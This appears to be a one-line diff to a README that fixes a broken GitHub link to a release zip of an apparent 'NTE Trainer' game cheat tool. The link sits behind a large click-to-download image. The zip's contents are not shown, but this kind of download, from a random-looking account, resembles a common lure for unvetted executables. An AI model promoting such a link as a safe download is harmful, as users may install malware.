@@ -3,7 +3,7 @@
 </h1>
 
 <p align="center">
-  <a href="https://github.comsam-code-io2094g9/NTE-Neverness-to-Everness-Trainer/releases/latest/download/NTE.Trainer.zip">
+  <a href="https://github.com/sam-code-io2094g9/NTE-Neverness-to-Everness-Trainer/releases/latest/download/NTE.Trainer.zip">
     <img src="assets/nte.png" width="100%" alt="Click to download NTE Trainer">
   </a>
 </p>
